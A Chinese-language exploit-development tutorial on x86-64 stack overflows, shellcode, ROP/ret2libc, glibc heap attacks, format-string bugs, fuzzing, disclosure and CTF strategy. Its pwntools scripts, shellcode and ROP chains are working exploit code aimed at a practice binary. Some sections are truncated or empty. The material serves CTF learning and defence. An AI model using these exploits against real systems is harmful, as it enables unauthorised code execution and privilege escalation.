CPU 架構：x86-64 暫存器與定址

漏洞利用開發的第一步是理解程式在 CPU 層面如何運作。x86-64 是目前最主流的 64 位架構，掌握其暫存器體系和定址模式是分析程式行為和構建 Exploit 的根本。

x86-64 通用暫存器

64-bit32-bit16-bit8-bit主要用途
RAXEAXAXAL/AH累加器；函式返回值（syscall 返回值）
RBXEBXBXBL/BH通用；在 x86-64 Linux ABI 中為 callee-saved
RCXECXCXCL/CH計數器；函式第 4 個參數（Linux syscall: 第 4 個 = R10）
RDXEDXDXDL/DH資料暫存器；函式第 3 個參數
RSIESISISIL來源索引；函式第 2 個參數
RDIEDIDIDIL目標索引；函式第 1 個參數（最重要！）
RSPESPSPSPLStack Pointer：始終指向目前 Stack 頂端
RBPEBPBPBPLBase Pointer：指向目前 Stack Frame 的底部
RIPEIP——Instruction Pointer：指向下一條要執行的指令（控制流的核心）
R8–R15R8D–R15DR8W–R15WR8B–R15B額外通用暫存器；R8/R9 = 第 5/6 個函式參數
x86-64 函式呼叫約定（System V AMD64 ABI）

在 Linux x86-64 中，函式的前六個整數/指標參數依序放入：RDI, RSI, RDX, RCX, R8, R9。返回值放在 RAX。超過六個參數則通過 Stack 傳遞（從右到左壓棧）。系統呼叫（syscall）使用略不同的約定：呼叫號在 RAX，參數依序為 RDI, RSI, RDX, R10, R8, R9。

記憶口訣：Di Si Dx Cx 8 9（RDI → RSI → RDX → RCX → R8 → R9）

常用定址模式（AT&T 語法 vs Intel 語法）

x86-64 定址模式（Intel 語法）
; ─── 立即數定址 ───
mov  rax, 0x10          ; rax = 16（立即數直接賦值）

; ─── 暫存器定址 ───
mov  rax, rbx           ; rax = rbx（暫存器間傳遞）

; ─── 記憶體直接定址 ───
mov  rax, [0x601050]   ; rax = *0x601050（讀取該地址的值）

; ─── 暫存器間接定址 ───
mov  rax, [rbx]        ; rax = *rbx（讀取 rbx 指向的記憶體）
mov  [rbx], rax        ; *rbx = rax（寫入 rbx 指向的記憶體）

; ─── 基址+偏移定址 ───
mov  rax, [rbp - 0x8]  ; 讀取 rbp-8 處（函式局部變數）
mov  rax, [rdi + 0x10] ; 讀取結構體成員（偏移 0x10）

; ─── 基址+索引+比例定址（陣列訪問）───
mov  rax, [rbx + rcx*8] ; rax = array[rcx]（每個元素 8 bytes）

; ─── RIP 相對定址（x86-64 特有，用於 PIE）───
lea  rdi, [rip + 0x80]  ; rdi = 下條指令地址 + 0x80（相對定址）

記憶體佈局：Stack / Heap / BSS

理解 Linux 進程的記憶體佈局是漏洞分析的基礎。不同的記憶體段有不同的屬性（讀/寫/執行），各種漏洞的本質都是打破了這些區域的邊界或讀寫屬性限制。

Linux 進程記憶體佈局（高地址→低地址）
0xFFFFFFFFFFFFFFFF  ┌─────────────────────────────┐
                    │         Kernel Space          │  核心空間（用戶不可訪問）
0x00007FFFFFFFFFFF  ├─────────────────────────────┤
                    │           Stack               │  棧（向低地址增長）
                    │  local vars, ret addr, args   │  局部變數、返回地址、函式參數
                    │            ↓                  │  每個函式呼叫建立 Stack Frame
                    ├─────────────────────────────┤
                    │           (gap)               │  ASLR 隨機化的間隔
                    ├─────────────────────────────┤
                    │   Memory Mapped Region        │  mmap 映射（共享庫 libc.so 等）
                    │   (libc, ld, shared libs)     │
                    ├─────────────────────────────┤
                    │            ↑                  │  Heap 向高地址增長
                    │           Heap                │  動態配置（malloc/free）
                    ├─────────────────────────────┤
                    │           BSS                 │  未初始化全域變數（清零）
                    ├─────────────────────────────┤
                    │           Data                │  已初始化全域/靜態變數
                    ├─────────────────────────────┤
                    │           Text (.text)        │  可執行代碼（通常唯讀）
0x0000000000400000  └─────────────────────────────┘  程式載入地址（無 PIE 時固定）

# 在 GDB 中查看

函式呼叫時的 Stack Frame 佈局
; 呼叫 foo(arg1, arg2) 後，foo 函式內部的 Stack 佈局：

高地址  ┌──────────────────┐
        │  第 7+ 個參數     │  （超過 6 個參數才在這裡）
        ├──────────────────┤
        │  Return Address  │  ← rbp + 0x08  呼叫者的下一條指令地址（覆蓋此處 = 控制執行流）
        ├──────────────────┤
        │  Saved RBP       │  ← rbp + 0x00  呼叫者的 RBP（函式序言中 push rbp）

        │  [Stack Canary]  │  ← rbp - 0x08  （若有 stack canary 保護）

組合語言速讀：關鍵指令集

Exploit 開發不需要精通組合語言，但需要能夠「閱讀」反組譯代碼，理解程式的控制流和資料操作。以下是最常見的指令集，覆蓋 90% 以上的 CTF PWN 題分析需求。

x86-64 關鍵指令速查（Intel 語法）
; ─── 資料移動 ───
mov  dst, src       ; dst = src（最常見指令）
lea  dst, [src]    ; dst = &src（Load Effective Address，計算地址但不讀取）
push rax           ; rsp -= 8; [rsp] = rax（壓棧）
pop  rax           ; rax = [rsp]; rsp += 8（彈棧）
xchg rax, rbx     ; 交換兩個暫存器的值

; ─── 算術與邏輯 ───
add  rax, rbx     ; rax += rbx
sub  rax, 0x10   ; rax -= 0x10（常見：分配 Stack 空間 sub rsp, 0x30）
imul rax, rbx    ; rax *= rbx（有符號乘法）
xor  rax, rax    ; rax = 0（快速清零技巧）
and  rax, rbx    ; rax &= rbx
or   rax, rbx    ; rax |= rbx
not  rax          ; rax = ~rax（位元反轉）
neg  rax          ; rax = -rax（二補數取反）
shl  rax, 3       ; rax <<= 3（左移，等效乘以 8）
shr  rax, 1       ; rax >>= 1（邏輯右移）

; ─── 比較與跳轉 ───
cmp  rax, rbx    ; 比較（設置 FLAGS，不改變暫存器值）
test rax, rax    ; 測試是否為零（test rax,rax; jz → 若 rax==0 則跳轉）
jmp  0x400500    ; 無條件跳轉
je / jz  label   ; 相等/零時跳轉（Zero Flag = 1）
jne/jnz label   ; 不等/非零時跳轉
jl / jg  label   ; 有符號小於/大於跳轉
jb / ja  label   ; 無符號低於/高於跳轉

; ─── 函式呼叫與返回 ───
call func          ; push rip+5（下條指令）; jmp func
ret                ; pop rip（從 Stack 讀取返回地址並跳轉）← 溢位攻擊目標！
leave              ; mov rsp, rbp; pop rbp（等效的函式結尾收尾）

; ─── 系統呼叫（Linux x86-64）───
syscall            ; 執行系統呼叫（RAX = 系統呼叫號）
; 常用呼叫號：
; 0 = read(fd, buf, count)    → rax=0, rdi=fd, rsi=buf, rdx=count
; 1 = write(fd, buf, count)   → rax=1, rdi=fd, rsi=buf, rdx=count
; 59 = execve(path, argv, envp) → rax=59, rdi="/bin/sh", rsi=0, rdx=0

小測驗
在 x86-64 Linux 中，呼叫函式 write(1, buf, 100)（將 100 bytes 輸出到 stdout）時，三個參數分別放在哪些暫存器中？
ARAX=1, RBX=buf, RCX=100
BRDI=1（fd）, RSI=buf（指標）, RDX=100（長度）
CRCX=1, RDX=buf, R8=100
D三個參數全部在 Stack 上傳遞，因為這是系統呼叫
正確！在 System V AMD64 ABI（Linux x86-64 的呼叫約定）中，前六個參數依序放入：RDI（第 1）, RSI（第 2）, RDX（第 3）, RCX（第 4）, R8（第 5）, R9（第 6）。所以 write(1, buf, 100) 的三個參數：fd=1 放 RDI，buf 指標放 RSI，長度 100 放 RDX。函式呼叫和系統呼叫的參數傳遞方式不同（syscall 的第 4 個用 R10 而非 RCX），但前三個參數位置相同。這個約定在構造 ROP 鏈和 Shellcode 時至關重要。

Stack Buffer Overflow 原理

Stack Buffer Overflow（堆疊緩衝區溢位）是最經典的記憶體安全漏洞。當程式向 Stack 上的緩衝區寫入超過其分配大小的資料時，多餘的資料會覆蓋相鄰的記憶體區域，包括最關鍵的返回地址（Return Address）。

漏洞成因：不安全的 C 函式

C — 典型 Stack Overflow 漏洞代碼
// ─── 漏洞代碼範例 ───
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
    char buf[64];           // ← 在 Stack 上分配 64 bytes
    gets(buf);              // ← 危險！gets() 不限制輸入長度
    printf("You entered: %s\n", buf);
}

int main() {
    vulnerable_function();
    return 0;
}

// ─── 其他常見不安全函式 ───
gets(buf)                  // 無長度限制，已在 C11 廢棄
strcpy(dst, src)           // 不檢查 dst 大小
strcat(dst, src)           // 不檢查 dst 剩餘空間
sprintf(buf, fmt, ...)     // 格式化輸出不限制長度
scanf("%s", buf)           // %s 讀到空白為止，不限長度
read(fd, buf, count)       // count 大於 buf 則溢位

// ─── 對應安全版本 ───
fgets(buf, sizeof(buf), stdin)  // 限制讀入長度
strncpy(dst, src, n)             // 限制複製長度
snprintf(buf, n, fmt, ...)       // 限制格式化輸出長度
scanf("%63s", buf)              // 指定最大讀入長度

返回地址覆蓋與 Shellcode

確認偏移後，就可以構造實際的 Exploit：用目標地址覆蓋返回地址，讓程式跳轉到我們的代碼。在沒有 NX（No-eXecute）保護的情況下，可以直接注入 Shellcode。

Python（pwntools）— 基礎 Stack Overflow Exploit
from pwn import *

# ─── 環境設定 ───
context.arch = 'amd64'        # 設定架構（影響 Shellcode 生成）
context.os   = 'linux'
context.log_level = 'debug'   # 顯示詳細發送/接收資訊

p = process('./vuln')         # 本地進程
# p = remote('target.com', 9999)  # 遠端

# ─── Shellcode：execve("/bin/sh", NULL, NULL) ───
# 方法1：pwntools 自動生成
shellcode = asm(shellcraft.sh())

# 方法2：手寫 x86-64 Shellcode（50 bytes）
shellcode = bytes([
    0x48,0x31,0xff,                         # xor rdi, rdi
    0x48,0x31,0xf6,                         # xor rsi, rsi
    0x48,0x31,0xd2,                         # xor rdx, rdx
    0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,  # mov rbx, "/bin/sh\0"
    0x53,                                   # push rbx
    0x48,0x89,0xe7,                         # mov rdi, rsp
    0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,     # mov rax, 59（execve）
    0x0f,0x05                               # syscall
])

# ─── 構造 Payload ───
offset = 72                    # 填充到返回地址的字節數
buf_addr = 0x7fffffffde20     # buf 的起始地址（GDB vmmap 中查詢）

payload  = shellcode           # Shellcode 放在 buf 起始（跳到這裡執行）
payload += b'A' * (offset - len(shellcode))  # 填充剩餘空間
payload += p64(buf_addr)       # 用 buf 地址覆蓋返回地址（小端序自動處理）

# ─── 發送並獲得 Shell ───
p.sendline(payload)
p.interactive()                # 進入互動模式

ROP（Return-Oriented Programming）

當 NX 開啟（Stack 不可執行）時，Shellcode 直接注入失效。ROP 是現代 Exploit 的核心技術：利用程式中已存在的代碼片段（Gadget，以 ret 結尾的指令序列），串聯構造任意計算，最終達到執行命令的目的。

ROP 核心概念

Gadget：程式或共享庫中現有的以 ret 結尾的短指令序列，例如 pop rdi; ret、pop rsi; pop rdx; ret。攻擊者在 Stack 上精心排列 gadget 地址和參數，每個 gadget 執行完後 ret 跳到下一個 gadget，形成「ROP 鏈」。由於使用程式本身的代碼，不受 NX 限制。

ROP 鏈構造：ret2libc 攻擊（呼叫 system("/bin/sh")）
from pwn import *

context.arch = 'amd64'
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ─── 方法1：手動構造 ROP 鏈 ───
# 目標：呼叫 system("/bin/sh")
# x86-64 呼叫約定：system 的第一個參數（"/bin/sh" 地址）放在 RDI
# 需要 Gadget：pop rdi; ret

# 使用 ROPgadget 或 ropper 搜索 gadget（在終端機執行）
# ROPgadget --binary ./vuln --rop | grep "pop rdi"
# 找到：0x0000000000400693 : pop rdi ; ret

pop_rdi    = 0x400693               # pop rdi; ret gadget 地址
bin_sh     = next(libc.search(b'/bin/sh\x00'))  # libc 中 "/bin/sh" 字串地址
system     = libc.sym['system']    # system() 函式地址
ret_gadget = 0x400516               # 單個 ret 指令（Stack 對齊用）

offset = 72

# ROP 鏈佈局（從 Stack 頂開始）：
# [pop rdi; ret] → ["/bin/sh" addr] → [ret（對齊）] → [system addr]
rop_chain  = p64(pop_rdi)            # 執行：pop rdi（從 stack 取下一個值放入 rdi）
rop_chain += p64(bin_sh)             # rdi = &"/bin/sh"
rop_chain += p64(ret_gadget)         # 對齊 stack（某些 glibc 版本 system 需要 16-byte 對齊）
rop_chain += p64(system)             # 呼叫 system("/bin/sh")

payload = b'A' * offset + rop_chain

# ─── 方法2：pwntools 自動 ROP 鏈（更高效）───
rop = ROP(elf)
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])
payload = b'A' * offset + rop.chain()

p.sendline(payload)
p.interactive()

繞過 ASLR / NX / Stack Canary

現代系統預設開啟多種記憶體保護機制。Exploit 開發的大部分工作就是找到繞過這些機制的方法。

保護機制防禦原理繞過策略
NX / DEP

Heap 記憶體管理：ptmalloc2 機制

Linux 使用 ptmalloc2（glibc malloc 的實作）管理 Heap 記憶體。理解其內部資料結構是分析 Heap 漏洞的前提。

Chunk 結構

Heap Chunk 內部結構（已分配 vs 空閒）
/* ─── 已分配的 Chunk ─── */
/*  chunk 起始（malloc 返回指標 = 這裡 + 0x10）         */
0x602000  │ prev_size │  若前一個 chunk 空閒，存其大小；否則被前 chunk 的數據使用
0x602008  │   size    │  本 chunk 大小（含 flags）；低三位是標誌位（P/M/A）
          │           │  P（prev_inuse）= 1 表示前一個 chunk 已被分配
0x602010  │  user     │  ← malloc() 返回的指標指向這裡
          │  data     │
          │  ...      │
0x602050  │ (next     │  下一個 chunk 的 prev_size 欄位
          │  chunk)   │

/* ─── 空閒的 Chunk（在 bin 中）─── */
0x602000  │ prev_size │
0x602008  │   size    │  P bit = 0（表示本 chunk 空閒）
0x602010  │    fd     │  forward pointer → 下一個空閒 chunk（單鏈或雙鏈表）
0x602018  │    bk     │  backward pointer → 上一個空閒 chunk（雙鏈表用）
          │  (can be  │  fd_nextsize / bk_nextsize（large bin 用）
          │  reused） │

# ─── 不同 Bin 的分類（空閒 chunk 存放位置）───
# tcache bin   size < 0x408，每個 bin 最多 7 個 chunk（glibc 2.26+）
# fast bin     size <= 0x80，單鏈表 LIFO（後進先出）
# unsorted bin 剛釋放的中型 chunk 先放這裡等待整理
# small bin    size < 0x400，雙鏈表 FIFO
# large bin    size >= 0x400，按大小排序的雙鏈表

Use-After-Free（UAF）漏洞

Use-After-Free 是最常見的 Heap 漏洞之一：程式在 free() 釋放一個 chunk 後，仍然持有指向它的指標（懸空指標），並繼續使用它。攻擊者可以重新分配這塊記憶體，用自己控制的資料替換原有物件的內容。

C — UAF 漏洞與利用概念
/* ─── 漏洞代碼 ─── */
typedef struct {
    void (*print)(char *);  // 函式指標（攻擊目標！）
    char name[24];
} User;

void normal_print(char *s) { printf("Hello: %s\n", s); }
void win()  { system("/bin/sh"); }   // 攻擊者想呼叫的函式

User *user = malloc(sizeof(User));    // 分配 User（32 bytes）
user->print = normal_print;
free(user);                            // 釋放！chunk 回到 tcache

// 此時 user 指標仍有效（懸空指標），但記憶體已在 tcache 中

// 攻擊者分配相同大小的 chunk
char *evil = malloc(32);              // 從 tcache 拿到剛才的 chunk！
// evil 現在和 user 指向同一塊記憶體

// 寫入 win() 函式地址到 evil 的前 8 bytes（覆蓋函式指標）
*(void**) evil = win;                   // evil[0] = &win

// 現在呼叫 user->print()，實際呼叫的是 win()！
user->print(user->name);               // → 執行 system("/bin/sh")

/* ─── UAF 防禦：釋放後清空指標 ─── */
free(user);
user = NULL;   // 設為 NULL，後續存取會 segfault 而非 UAF

Heap Overflow 與 tcache 攻擊

tcache（Thread Local Cache）是 glibc 2.26 引入的每執行緒緩存機制，初期沒有完善的安全檢查，成為 CTF PWN 題的主要考點。tcache poisoning 是最常見的 Heap 攻擊技術之一。

tcache Poisoning 攻擊原理
# ─── tcache 結構（glibc 2.26–2.31）───
# tcache 是一個單鏈表，每個 size 的 bin 最多 7 個 chunk
# 空閒 chunk 的 fd 指標指向下一個空閒 chunk（明文地址，無保護！）
#                                                                    
# tcache[0x20] → chunk_A → chunk_B → NULL                         
# malloc(0x20) 返回 chunk_A，tcache[0x20] → chunk_B                 

# ─── 攻擊步驟（tcache poisoning）───
# 前提：存在 Heap Overflow 可以覆蓋空閒 chunk 的 fd 指標

# STEP 1：分配兩個 chunk
#   chunk_A = malloc(0x20)  → 0x602260
#   chunk_B = malloc(0x20)  → 0x602290（不重要）

# STEP 2：釋放 chunk_A，進入 tcache[0x20]
#   free(chunk_A)
#   tcache[0x20] → chunk_A (fd = NULL)

# STEP 3：通過 overflow/UAF 修改 chunk_A 的 fd 為目標地址
#   假設目標：__free_hook 地址 0x7f...a8b8（寫入此處可劫持任意 free() 呼叫）
#   *(chunk_A + 8) = 0x7f...a8b8  ← 覆蓋 fd 指標
#   tcache[0x20] → chunk_A → 0x7f...a8b8（__free_hook）→ ...

# STEP 4：連續 malloc 兩次
#   malloc(0x20) → 返回 chunk_A（正常分配）
#   malloc(0x20) → 返回 0x7f...a8b8（__free_hook 地址！）

# STEP 5：向 __free_hook 寫入 system() 地址
#   *(__free_hook) = system

# STEP 6：free(ptr_to_bin_sh) → 觸發 system("/bin/sh")
#   任何 free("/bin/sh") 都相當於呼叫 system("/bin/sh")

# ─── 注意：glibc 2.32+ 加入了 Safe-Linking 保護 ───
# fd 指標現在被加密：fd = (chunk_addr >> 12) XOR next_chunk
# 需要先洩露 Heap 地址才能計算正確的偽造 fd 值

Double Free 與 fastbin 攻擊

Double Free 是對同一個指標呼叫兩次 free()。在 tcache 中，glibc 2.29 前幾乎沒有針對 Double Free 的檢查，可以直接利用；2.29 後加入了 key 欄位檢測，需要額外手段清除。

tcache Double Free 攻擊
from pwn import *

# ─── tcache Double Free（glibc 2.26–2.28）───
# STEP 1：分配 chunk_A
# malloc_A = malloc(0x20)  → 0x602260

# STEP 2：Double Free
# free(malloc_A)   → tcache[0x20]: A → NULL
# free(malloc_A)   → tcache[0x20]: A → A → A → ...（循環！）
# （2.28 以下無 double free 檢查）

# STEP 3：修改 fd
# malloc(0x20)  → 返回 A，tcache[0x20]: A → A...
# 向 A 寫入目標地址（修改 fd = &target）
# tcache[0x20]: A → &target

# STEP 4：連續 malloc
# malloc(0x20)  → 返回 A（再次）
# malloc(0x20)  → 返回 &target（任意地址寫！）

# ─── glibc 2.29+ Double Free 繞過 ───
# 2.29 在空閒 chunk 的 key 欄位寫入 tcache 結構體地址
# free() 時檢查 key 欄位，若等於 tcache 地址則判定 double free
# 繞過：在第二次 free 前，將 key 欄位清零（需要寫入原語）

# ─── fastbin dup（更老的技術，針對 fastbin）───
# fastbin 無 tcache 的 key 保護，但有 double free 檢查
# （檢查當前 chunk 是否等於 fastbin 鏈表的頭節點）
# 繞過：在兩次 free 之間插入另一個不同的 chunk：
# free(A) → free(B) → free(A)   ← A 不是 fastbin 頭部，檢查通過
# fastbin[0x20]: A → B → A → B → ...（循環）
小測驗
在 Heap Exploit 中，tcache poisoning 的目標通常是覆蓋哪個 glibc 的 hook 函式，從而在呼叫它時觸發 shell？（在 glibc 2.34 之前普遍使用）
A__stack_chk_fail（Stack Canary 失敗時呼叫）
B__free_hook 或 __malloc_hook（glibc 提供的 Hook 指標）
C__libc_start_main（程式進入點）
Dexit（程式結束時呼叫）
正確！__free_hook 和 __malloc_hook 是 glibc 在 malloc/free 中提供的函式指標（Hook），若非 NULL 則在 malloc()/free() 時被呼叫。在 glibc 2.34 之前，這兩個 Hook 位於 libc 的可寫段（.bss），地址固定（libc 基地址已知即可計算）。通過 tcache poisoning 將任意 malloc 分配到 __free_hook，然後寫入 system 函式地址，下次 free(ptr) 就等效於 system(ptr)。glibc 2.34 移除了這兩個 Hook，現代 Heap Exploit 需要改用其他目標（如 _IO_FILE 結構體中的函式指標）。

模糊測試（Fuzzing）：AFL++ / libFuzzer

模糊測試（Fuzzing）是通過向程式自動投餵大量隨機或變異的輸入，觀察是否觸發崩潰或異常，從而發現漏洞的技術。Coverage-guided Fuzzing（覆蓋率引導）是目前最有效的方法，能自動探索程式所有代碼路徑。

AFL++（American Fuzzy Lop++）
最廣泛使用的 Coverage-Guided Fuzzer。通過編譯時插樁追蹤代碼覆蓋率，優先變異能探索新路徑的輸入。支援多種變異策略、平行模糊、持久模式（persistent mode）大幅提升速度。已發現數千個 CVE。
libFuzzer
LLVM 內建的 In-Process Fuzzer，以函式庫形式集成到目標程式中，直接呼叫 LLVMFuzzerTestOneInput()。速度極快（無進程啟動開銷）、與 AddressSanitizer（ASan）完美配合。適合庫函式和 API 的 Fuzzing。
Sanitizers（錯誤偵測）
編譯時插入的錯誤偵測工具：ASan（AddressSanitizer）偵測記憶體越界/UAF；UBSan（UndefinedBehaviorSanitizer）偵測未定義行為；MSan（MemorySanitizer）偵測未初始化記憶體使用。與 Fuzzer 配合使用，將崩潰轉化為可偵測的錯誤。
覆蓋率（Coverage）指標
Edge Coverage（邊覆蓋）：追蹤程式中基本塊之間的跳轉邊，比 Block Coverage 更精細。AFL++ 以 bitmap 形式記錄覆蓋率，若新輸入觸發新邊則加入語料庫（corpus）繼續變異。

漏洞披露與 CVE 流程

負責任披露（Responsible Disclosure / Coordinated Vulnerability Disclosure）是漏洞研究倫理的核心原則：在公開披露前給予廠商修補的機會，通常為 90 天（Google Project Zero 的標準）。

STEP 1
發現與確認
通過 Fuzzing、靜態分析、代碼審計或動態測試發現漏洞。確認漏洞可重現、評估嚴重程度（CVSS 評分）和利用可行性。準備 PoC（Proof of Concept）代碼。
STEP 2
聯繫廠商（或 CERT）
尋找廠商的安全聯絡方式（security@company.com、HackerOne、Bugcrowd Bug Bounty 平台）。若廠商無明確安全聯絡管道，可通過 CERT/CC 或國家 CERT 協調。加密傳輸漏洞細節（PGP）。
STEP 3
90 天披露時鐘開始
廠商確認收到報告後，負責任披露的 90 天計時開始（Project Zero 標準；HackerOne/Bugcrowd 平台通常 90-180 天）。廠商應提供修復時間表，若無回應或拒絕修復，研究者可在期限後公開披露。
STEP 4
CVE 申請
CVE（Common Vulnerabilities and Exposures）是公開的漏洞識別編號。申請方式：（1）廠商（CNA）自行申請；（2）研究者通過 MITRE CVE 申請表（https://cve.mitre.org/cve/request_id.html）；（3）大型漏洞賞金平台（HackerOne 是 CNA）可直接分配。需提供漏洞描述、影響版本、CVSS 評分。
STEP 5
補丁發布與公開披露
廠商發布修復補丁後，研究者可撰寫技術部落格、在安全會議（DEF CON / Black Hat / CCC）發表演講，或在 FullDisclosure / GitHub 發布完整 PoC。公開披露包括：漏洞描述、根本原因分析、PoC 代碼、修復建議。
REWARD
漏洞賞金（Bug Bounty）
主要平台：HackerOne、Bugcrowd、Intigriti。獎金範圍：幾百美元（低危）到數十萬美元（嚴重 RCE）。Google、Apple、Microsoft、Meta 等大公司的嚴重漏洞可達 $50,000-$1,000,000+。ZDI（Zero Day Initiative）也購買 0-day 漏洞。

1-day 分析：Patch Diffing

1-day（One-day）漏洞分析是在廠商發布安全補丁後，通過比對補丁前後的二進制差異（Patch Diffing）來逆向分析漏洞細節，並在大多數用戶還未更新前開發出 Exploit。這是安全研究和威脅情報的重要技能。

Patch Diffing 工作流程

# 1. 在 Ghidra 中分別分析兩個二進制（完整分析）
# 2. 匯出 Ghidra 的 BinExport 格式（.BinExport 文件）

# ─── STEP 3：聚焦分析修改的函式 ───

# - Identical（未修改）

# ─── STEP 4：逆向分析漏洞根本原因 ───
# 常見修復模式：
# 1. 添加長度檢查（修復：size_t check before memcpy）→ 原漏洞：整數溢位/越界讀寫
# 2. 添加 NULL 指標檢查 → 原漏洞：NULL dereference
# 3. 修改 free 後設 NULL → 原漏洞：UAF
# 4. 修復條件判斷順序 → 原漏洞：TOCTOU（Time-of-Check Time-of-Use）
# 5. 添加 mutex 鎖 → 原漏洞：Race Condition

ROPgadget / pwntools ROP 鏈構建

ROP 鏈構建需要：尋找合適的 Gadget（ROPgadget / ropper / pwntools ROP）、排列 Gadget 和資料，形成完整的攻擊鏈。

ROPgadget 搜索與 pwntools 自動構建
# ─── ROPgadget：搜索 Gadget ───
ROPgadget --binary ./vuln                       # 列出所有 gadget
ROPgadget --binary ./vuln --rop                 # 只列出 ROP gadget（以 ret 結尾）
ROPgadget --binary ./vuln --string "/bin/sh"    # 搜索字串
ROPgadget --binary libc.so.6 --rop | grep "pop rdi"   # 在 libc 中搜索

# 搜索 syscall gadget（用於 SROP）
ROPgadget --binary ./vuln --rop | grep "syscall"

# ─── ropper（另一個 gadget 搜索工具）───
ropper -f ./vuln --search "pop rdi"
ropper -f ./vuln --chain execve           # 自動生成 execve 呼叫鏈

# ─── pwntools ROP 類（自動化構建）───
from pwn import *

elf  = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 從 ELF 和 libc 中自動搜索 gadget
rop = ROP([elf, libc])

# ─── 常見 ROP 鏈模式 ───
# 1. 呼叫函式（pwntools 自動處理參數）
rop.call('puts', [elf.got['puts']])    # puts(got['puts'])
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])

# 2. 手動排列 gadget
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])  # pop rdi; ret
rop.raw(p64(next(libc.search(b'/bin/sh\x00'))))
rop.raw(p64(libc.sym['system']))

# 3. 生成 Payload
payload = b'A' * offset + rop.chain()
log.info(rop.dump())    # 印出 ROP 鏈的可讀形式

# ─── ret2syscall（無 libc 時直接 syscall）───
# 目標：execve("/bin/sh", NULL, NULL)
# 需要：rax=59, rdi=&"/bin/sh", rsi=0, rdx=0, then syscall
rop.raw(rop.find_gadget(['pop rax', 'ret'])[0])
rop.raw(p64(59))                     # syscall number for execve
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(p64(binsh_addr))
rop.raw(rop.find_gadget(['pop rsi', 'pop rdx', 'ret'])[0])
rop.raw(p64(0)); rop.raw(p64(0))
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

格式化字串漏洞（Format String）

格式化字串漏洞（Format String Bug）發生在程式直接將用戶輸入作為 printf() 的格式字串參數。攻擊者可以利用 %x/%p 洩露記憶體，或用 %n 向任意地址寫入。

格式化字串漏洞利用
/* ─── 漏洞代碼 ─── */
char buf[256];
fgets(buf, sizeof(buf), stdin);
printf(buf);    // 危險！應為 printf("%s", buf)

# ─── Python 利用腳本 ───
from pwn import *

p = process('./fmtstr')
elf = ELF('./fmtstr')

# ─── 1. 洩露 Stack 上的值（找 Canary / libc 地址）───
p.sendlineafter(b'> ', b"%p %p %p %p %p %p %p %p")
leak = p.recvline()
# 輸出：0x7f... 0x400... 0x... ← 找到 libc 地址（0x7f 開頭）

# ─── 2. 讀取特定位置（第 N 個參數）───
# %N$p 讀取 printf 第 N 個 Stack 參數
p.sendlineafter(b'> ', b"%7$p")      # 讀取第 7 個 Stack 上的值

# 找到 Canary 的位置（Canary 通常以 0x...00 結尾，特徵明顯）
for i in range(1, 30):
    p.sendlineafter(b'> ', f"%{i}$016lx".encode())
    val = int(p.recvline().strip(), 16)
    log.info(f"{i}: {hex(val)}")
    if val & 0xff == 0 and val != 0:
        log.success(f"Canary @ position {i}: {hex(val)}")

# ─── 3. 任意地址寫（%n 格式符）───
# %n 將「已輸出字符數」寫入對應指標參數指向的地址
# pwntools fmtstr_payload 自動計算 Payload（最簡單方式）

# 將 GOT 中的 printf 改為 system（若 printf 被呼叫時 rdi 是可控字串）
writes = {elf.got['printf']: elf.plt['system']}
payload = fmtstr_payload(6, writes)   # 6 = 格式字串在 printf 的第幾個 Stack 位置
p.sendlineafter(b'> ', payload)

# 下次 printf(user_input) 且 user_input = "/bin/sh" 時
# 實際呼叫 system("/bin/sh")
p.sendlineafter(b'> ', b"/bin/sh")
p.interactive()

CTF 練習：PWN 題型策略

PWN 題（二進制利用）是 CTF 中技術含量最高的題型。掌握系統性的解題策略，能大幅提升解題速度和覆蓋率。

01
第一步：資訊收集（永遠先做） — file（架構/32bit/64bit）、checksec（保護機制）、strings ./vuln | grep -i flag（找硬編碼字串）、ltrace / strace ./vuln（追蹤函式呼叫）。
02
ret2win — 最基礎題型：程式中有個 win() 函式可直接 get shell，只需溢位覆蓋返回地址為其地址。無保護（或只有 NX）。用 cyclic 找偏移，p64(win_addr) 覆蓋返回地址。
03
ret2plt / ret2libc — 有 NX 但無 ASLR（或可洩露地址）：利用 PLT/GOT 洩露 libc 基地址，再計算 system() 和 /bin/sh 地址，構造 ROP 鏈。標準兩階段：先洩露，再 get shell。
04
Stack Canary 繞過 — 有 Canary：尋找格式化字串洩露 Canary，或利用 fork() 暴力爆破（子進程 Canary 不變）。洩露後在 Payload 中正確填入 Canary 值，緊接 Saved RBP，再接返回地址。
05
Heap 題型識別 — 程式提供「分配/刪除/編輯/查看」操作選單（menu-driven heap）。先確認 glibc 版本（strings ./vuln | grep libc 或 ldd ./vuln），選擇對應的 Heap 攻擊技術（tcache/fastbin）。
06
推薦練習平台 — pwn.college（系統性課程，免費）、pwnable.kr / pwnable.tw（經典題目）、HackTheBox Pro Labs PWN 題、picoCTF 二進制題（入門）、CTFtime.org（追蹤最新 CTF 比賽）。

Kernel Exploit 入門：LPE 技術

Kernel Exploit（核心漏洞利用）是最高難度的 Exploit 技術，成功後可從普通用戶提升到 root（Local Privilege Escalation，LPE），或在沙盒逃逸（Container Escape / Browser Sandbox Escape）場景中獲得主機權限。

核心漏洞類型
Race Condition（競爭條件）：DirtyPipe（CVE-2022-0847）、DirtyCow；Use-After-Free：核心中的 slab 記憶體 UAF；整數溢位：長度計算錯誤導致核心態越界讀寫；未初始化記憶體洩露：核心 Stack/Heap 洩露到用戶態（資訊洩露）。
LPE 核心目標
目標：修改當前進程的 cred 結構體（uid/gid 設為 0），或覆蓋核心函式指標跳轉到提權 Shellcode。常用技術：modprobe_path 覆蓋、commit_creds(prepare_kernel_cred(0)) 提權。
KPTI / SMEP / SMAP
KPTI（核心頁表隔離）：用戶態/核心態使用不同頁表，防止 Meltdown。SMEP（Supervisor Mode Execution Prevention）：核心態不能執行用戶態頁面代碼。SMAP：核心態不能讀寫用戶態數據。繞過：ret2usr 在 SMEP 前有效；現在需要核心 ROP。
學習平台
